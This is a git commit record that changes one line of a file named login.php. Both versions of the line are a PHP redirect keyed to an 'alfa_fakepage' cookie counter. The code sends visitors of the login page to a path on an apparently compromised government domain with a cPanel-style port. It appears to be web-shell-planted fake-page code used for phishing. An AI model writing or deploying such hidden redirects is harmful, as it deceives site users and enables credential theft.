cd530d161951926cf2130093f593ee8aab9bc982
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-08-19 04:23:16 +0700

    Update login.php

--- login.php
+++ login.php
@@ -1,1 +1,1 @@
-<?php if((int)$_COOKIE["alfa_fakepage_counter16973"]<3){@header("Location: http://sipenak.pn-tanjungkarang.go.id/.well-known/?:2083");exit;}?>
+<?php if((int)$_COOKIE["alfa_fakepage_counter16973"]<3){@header("Location: http://sipenak.pn-tanjungkarang.go.id/well-known/?:2083");exit;}?>
